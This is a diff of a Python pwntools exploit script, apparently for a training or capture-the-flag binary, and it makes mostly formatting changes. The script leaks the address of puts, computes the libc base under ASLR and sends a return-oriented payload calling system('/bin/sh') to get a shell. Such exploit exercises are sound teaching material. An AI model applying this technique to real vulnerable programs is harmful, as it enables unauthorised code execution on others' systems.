@@ -36,10 +36,6 @@ payload1 = (
     + main_line0
 )
 
-f = open("payload", "wb")
-f.write(payload1)
-f.close()
-
 p = process("./bin")
 
 if DEBUG:
@@ -47,24 +43,25 @@ if DEBUG:
 
 r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
 print(r)
+
 p.sendline(payload1)
 
-leak = p.recvn(7) # receive address of __GI__IO_puts plus line-feed.
-leak = leak[::-1] # reverse byte order for printing.
-leak = leak[1:] # slice off line-feed (0xa).
+leak = p.recvn(7)  # receive address of __GI__IO_puts plus line-feed.
+leak = leak[::-1]  # reverse byte order for printing.
+leak = leak[1:]  # slice off line-feed (0xa).
 
 # e.g. leak: b'7ffff7e4be10
 # x/i 0x7ffff7e4be10
 # 0x7ffff7e4be10 <__GI__IO_puts>:      push   r14
 
-print('puts leak: ', binascii.b2a_hex(leak))
+print("puts leak: ", binascii.b2a_hex(leak))
 
 # gdb gef> info proc map
 # 0x7ffff7dd6000     0x7ffff7dfc000    0x26000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.33.so
 
 
-libc_start_noaslr = 0x7ffff7dd6000
-leak = int.from_bytes(leak, byteorder='big', signed=False)
+libc_start_noaslr = 0x7FFFF7DD6000
+leak = int.from_bytes(leak, byteorder="big", signed=False)
 offset = leak - libc_start_noaslr
 
 # noaslr:
@@ -74,11 +71,11 @@ offset = leak - libc_start_noaslr
 # with aslr:
 # leak - 0x75e10 -> libc start
 
-print('offset:', offset, hex(offset))
-libc_start = hex(leak - 0x75e10)
+print("offset:", offset, hex(offset))
+libc_start = hex(leak - 0x75E10)
 
-print('libc start:', libc_start)
-print('compare with gdb> info proc map')
+print("libc start:", libc_start)
+print("compare with gdb> info proc map")
 
 r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
 print(r)
@@ -88,9 +85,9 @@ payload2 = (
     buffer
     + backup_base_pointer
     + rop_pop_rdi_ret
-    + bin_sh_string # aslr.
-    + system_call # aslr.
-    + exit_call # aslr.
+    + bin_sh_string  # aslr.
+    + system_call  # aslr.
+    + exit_call  # aslr.
 )
 
 p.sendline(payload2)
